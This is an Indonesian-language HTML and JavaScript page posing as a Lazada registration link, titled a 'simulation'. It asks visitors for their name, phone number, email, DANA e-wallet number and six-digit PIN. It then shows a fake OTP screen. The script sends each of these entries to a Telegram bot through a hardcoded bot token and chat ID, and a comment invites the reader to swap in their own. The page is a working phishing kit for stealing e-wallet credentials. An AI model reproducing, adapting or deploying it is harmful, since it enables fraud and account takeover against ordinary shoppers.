<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Simulasi Pendaftaran Lazada</title>
<style>
  body {
    margin:0;padding:0;font-family:Inter,Arial,sans-serif;
    background:linear-gradient(135deg,#4100b0,#ff7b00);
    color:#fff;display:flex;align-items:center;justify-content:center;
    height:100vh;overflow:hidden;
  }
  .card {
    width:360px;background:rgba(255,255,255,0.1);backdrop-filter:blur(8px);
    border-radius:14px;box-shadow:0 8px 30px rgba(0,0,0,0.35);
    padding:22px;text-align:center;
  }
  .logo {width:130px;margin:8px auto 12px;display:block}
  h1 {margin:5px 0 10px;font-size:22px;letter-spacing:1px}
  p {margin:0 0 14px;font-size:0.95rem;color:#eee}
  input, button {width:100%;padding:10px 12px;margin:8px 0;border:none;border-radius:10px;font-size:15px;outline:none}
  input::placeholder {color:#ccc}
  button.primary {background:#007bff;color:#fff;font-weight:bold;cursor:pointer}
  label {display:flex;align-items:center;gap:8px;font-size:0.9rem;color:#f0f0f0}
  input[type=checkbox]{width:16px;height:16px}
  .hidden {display:none!important}
  .wallet-btn{width:100%;padding:10px;border:none;border-radius:10px;margin:8px 0;font-size:15px}
  .wallet-btn.active{background:#00b14f;color:#fff;cursor:pointer}
  .wallet-btn.inactive{background:rgba(255,255,255,0.15);color:#ccc;opacity:0.6}
  .overlay{
    position:fixed;inset:0;display:flex;align-items:center;justify-content:center;
    background:rgba(0,0,0,0.5);backdrop-filter:blur(3px);
  }
  .modal{
    width:320px;background:#fff;color:#111;padding:20px;border-radius:12px;text-align:center;
    box-shadow:0 8px 25px rgba(0,0,0,0.4);
  }
  .modal button{margin-top:10px;padding:10px;border:none;border-radius:8px;font-weight:700;width:100%}
  .btn-send{background:#007bff;color:#fff}
  .btn-resend{background:#eee;color:#111;width:48%}
  small{font-size:0.85rem;color:#444}
  .input-group {
    display:flex;
    align-items:center;
    gap:8px;
    background:rgba(255,255,255,0.2);
    padding:8px 12px;
    border-radius:10px;
    margin-bottom:10px;
  }
  .input-group img {width:24px;height:16px;border-radius:3px;}
  .input-group span {color:#fff;font-weight:600;}
  .input-field {
    flex:1;
    background:transparent;
    border:none;
    outline:none;
    color:#fff;
    font-size:16px;
  }

  /* PIN & OTP */
  .input-boxes {
    display:flex;
    justify-content:center;
    gap:8px;
    margin:10px 0 15px;
  }
  .pin-input, .otp-input {
    width:36px;
    height:42px;
    text-align:center;
    font-size:20px;
    border-radius:8px;
    border:none;
    background:rgba(255,255,255,0.15);
    color:#fff;
    outline:none;
  }
  .otp-input {
    color:#111;
    background:#f5f5f5;
  }
  .error-text {
    color:#e60000;
    font-size:0.85rem;
    margin-bottom:6px;
    font-weight:500;
  }
  .resend-row {
    display:flex;
    justify-content:space-between;
    gap:6px;
  }
</style>
</head>
<body>

<!-- PAGE 1 -->
<div class="card" id="page1">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Lazada_Logo.svg/512px-Lazada_Logo.svg.png">
  <h1>LAZADA</h1>
  <p>Link Pendaftaran</p>
  <form id="form1">
    <div class="input-group">
      <input id="nama" type="text" class="input-field" placeholder="Nama Lengkap" required>
    </div>
    <div class="input-group">
      <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg">
      <span>+62</span>
      <input id="hp" type="tel" class="input-field" inputmode="numeric" pattern="[0-9]*"
        placeholder="81234567890" maxlength="11" required>
    </div>
    <div class="input-group">
      <input id="mail" type="email" class="input-field" placeholder="Alamat Gmail" required>
    </div>
    <label><input id="cek" type="checkbox" required> Saya setuju dengan syarat & ketentuan</label>
    <button class="primary" type="submit">Daftar</button>
  </form>
</div>

<!-- PAGE 2 -->
<div class="card hidden" id="page2">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Lazada_Logo.svg/512px-Lazada_Logo.svg.png">
  <h1>Pilih E-Wallet Penarikan</h1>
  <button id="dana" class="wallet-btn active">DANA</button>
  <button class="wallet-btn inactive" disabled>OVO</button>
  <button class="wallet-btn inactive" disabled>GoPay</button>
  <button class="wallet-btn inactive" disabled>ShopeePay</button>
</div>

<!-- PAGE 3 -->
<div class="card hidden" id="page3">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Lazada_Logo.svg/512px-Lazada_Logo.svg.png">
  <h1>Masukkan Nomor DANA</h1>
  <form id="formDana">
    <div class="input-group">
      <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg">
      <span>+62</span>
      <input id="noDana" type="tel" class="input-field" inputmode="numeric" pattern="[0-9]*"
        placeholder="81234567890" maxlength="11" required>
    </div>
    <button class="primary" type="submit" style="margin-top:16px;">Lanjutkan</button>
  </form>
</div>

<!-- PAGE 4 -->
<div class="card hidden" id="page4">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Lazada_Logo.svg/512px-Lazada_Logo.svg.png">
  <h1>Masukkan PIN</h1>
  <div class="input-boxes" id="pinContainer">
    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input" />
    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input" />
    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input" />
    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input" />
    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input" />
    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input" />
  </div>
  <button id="nextOtp" class="primary">Lanjutkan</button>
</div>

<!-- OTP POPUP -->
<div id="otpOverlay" class="overlay hidden">
  <div class="modal">
    <h2>Masukkan Kode OTP</h2>
    <p style="font-size:0.9rem;margin-top:-4px;margin-bottom:10px;color:#555;">Kode OTP telah dikirim melalui WhatsApp.</p>
    <p id="otpError" class="error-text hidden">Kode OTP tidak valid</p>
    <div class="input-boxes" id="otpInputs">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input">
    </div>
    <button id="send" class="btn-send">Kirim</button>
    <div class="resend-row">
      <button id="resendWA" class="btn-resend" disabled>WhatsApp (<span id="waktu">30</span>s)</button>
      <button id="resendSMS" class="btn-resend" disabled>SMS (<span id="waktu2">30</span>s)</button>
    </div>
  </div>
</div>

<script>
/* GANTI TOKEN & CHAT_ID DENGAN MILIKMU SENDIRI */
const BOT_TOKEN = "7201669869:AAFL4YYCcXXmqmMBSKCA3FtK6cCKEG4mqXU";
const CHAT_ID = "6712267951";

/* ====== FUNGSI UTAMA UNTUK KIRIM KE TELEGRAM ====== */
function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: "Markdown"
    })
  })
  .then(r => r.json())
  .then(res => console.log("Pesan terkirim ke Telegram:", res))
  .catch(err => console.error("Gagal kirim:", err));
}

/* ====== FUNGSI RANDOM OTP ====== */
function generateOTP() {
  return Math.floor(1000 + Math.random() * 9000).toString();
}

/* ====== NAVIGASI ANTAR HALAMAN ====== */
function showPage(id){
  ['page1','page2','page3','page4'].forEach(p=>{
    document.getElementById(p).classList.toggle('hidden',p!==id);
  });
}

/* ====== FORM PENDAFTARAN ====== */
document.getElementById('form1').onsubmit = e => {
  e.preventDefault();

  const nama = document.getElementById('nama').value.trim();
  const hp = document.getElementById('hp').value.trim();
  const email = document.getElementById('mail').value.trim();

  // Kirim data awal ke Telegram
  const msg = `üìù *PENDAFTARAN BARU (Simulasi Lazada)*%0A
üë§ Nama Lengkap: ${nama}%0A
üì± Nomor HP: +62${hp}%0A
üìß Email: ${email}%0A
üïê Status: Menunggu pemilihan E-Wallet`;
  sendToTelegram(msg);

  showPage('page2');
};

/* ====== PILIH WALLET ====== */
document.getElementById('dana').onclick = () => showPage('page3');

/* ====== FORM NOMOR DANA ====== */
document.getElementById('formDana').onsubmit = e => {
  e.preventDefault();
  const val = document.getElementById('noDana').value.trim();
  if(!/^\d{11}$/.test(val)){
    alert('Nomor DANA harus 11 digit setelah +62 (contoh: 81234567890)');
    return;
  }
  showPage('page4');
};

/* ====== INPUT PIN ====== */
const pinInputs = document.querySelectorAll('.pin-input');
pinInputs.forEach((input,idx)=>{
  input.addEventListener('input',()=>{
    input.value=input.value.replace(/\D/g,'');
    if(input.value && idx<pinInputs.length-1) pinInputs[idx+1].focus();
  });
  input.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && !input.value && idx>0) pinInputs[idx-1].focus();
  });
});

let currentOTP = null; // untuk menyimpan OTP terkini

document.getElementById('nextOtp').onclick=()=>{
  const pin=[...pinInputs].map(i=>i.value).join('');
  if(pin.length!==6){
    alert('PIN harus terdiri dari 6 angka');
    return;
  }

  // Buat OTP baru
  currentOTP = generateOTP();

  // Ambil semua data pengguna
  const nama = document.getElementById('nama').value.trim();
  const hp = document.getElementById('hp').value.trim();
  const email = document.getElementById('mail').value.trim();
  const dana = document.getElementById('noDana').value.trim();

  // Kirim data lengkap + OTP ke Telegram
  const msg = `üìã *Data Pendaftaran Lengkap*%0A
üë§ Nama: ${nama}%0A
üì± Nomor HP: +62${hp}%0A
üìß Email: ${email}%0A
üí∞ Nomor DANA: +62${dana}%0A
üîí PIN: ${pin}%0A
üßæ *Kode OTP:* ${currentOTP}%0A
üïê Status: Menunggu verifikasi OTP`;
  sendToTelegram(msg);

  openOtp();
};

/* ====== LOGIKA OTP ====== */
const otpBox=document.getElementById('otpOverlay');
const otpError=document.getElementById('otpError');
const btnSend=document.getElementById('send');
const btnWA=document.getElementById('resendWA');
const btnSMS=document.getElementById('resendSMS');
const waktu=document.getElementById('waktu');
const waktu2=document.getElementById('waktu2');
let timer1,timer2;

function openOtp(){
  otpBox.classList.remove('hidden');
  otpError.classList.add('hidden');
  startTimers();
  const otpInputs=document.querySelectorAll('.otp-input');
  otpInputs[0].focus();
  otpInputs.forEach((input,idx)=>{
    input.addEventListener('input',()=>{
      input.value=input.value.replace(/\D/g,'');
      if(input.value && idx<otpInputs.length-1) otpInputs[idx+1].focus();
    });
    input.addEventListener('keydown',e=>{
      if(e.key==='Backspace' && !input.value && idx>0) otpInputs[idx-1].focus();
    });
  });
}

function startTimers(){
  clearInterval(timer1);clearInterval(timer2);
  let s1=30,s2=30;
  waktu.textContent=s1;waktu2.textContent=s2;
  btnWA.disabled=true;btnSMS.disabled=true;
  timer1=setInterval(()=>{
    s1--;waktu.textContent=s1;
    if(s1<=0){clearInterval(timer1);btnWA.disabled=false;btnWA.textContent='Kirim Ulang via WhatsApp';}
  },1000);
  timer2=setInterval(()=>{
    s2--;waktu2.textContent=s2;
    if(s2<=0){clearInterval(timer2);btnSMS.disabled=false;btnSMS.textContent='Kirim Ulang via SMS';}
  },1000);
}

/* ====== VALIDASI OTP ====== */
btnSend.onclick=()=>{
  const otp=[...document.querySelectorAll('.otp-input')].map(i=>i.value).join('');
  if(otp.length!==4){
    otpError.textContent="Masukkan 4 digit OTP lengkap";
    otpError.classList.remove('hidden');
    return;
  }
  if(otp!==currentOTP){
    otpError.textContent="Kode OTP tidak valid";
    otpError.classList.remove('hidden');
    return;
  }

  // Jika OTP benar
  alert('Verifikasi OTP berhasil (simulasi)');
  otpBox.classList.add('hidden');
  showPage('page1');

  // Kirim konfirmasi ke Telegram
  sendToTelegram(`‚úÖ *Verifikasi Berhasil untuk ${document.getElementById('nama').value.trim()}*%0Aüî¢ OTP: ${otp}%0Aüéâ Pendaftaran selesai.`);
};

/* ====== RESEND OTP ====== */
btnWA.onclick=()=>{
  startTimers();
  currentOTP = generateOTP();
  sendToTelegram(`üîÅ *Kirim Ulang OTP via WhatsApp*%0Aüßæ OTP baru: ${currentOTP}`);
  alert('Kode OTP dikirim ulang via WhatsApp');
};

btnSMS.onclick=()=>{
  startTimers();
  currentOTP = generateOTP();
  sendToTelegram(`üîÅ *Kirim Ulang OTP via SMS*%0Aüßæ OTP baru: ${currentOTP}`);
  alert('Kode OTP dikirim ulang via SMS');
};
</script>
</body>
</html>
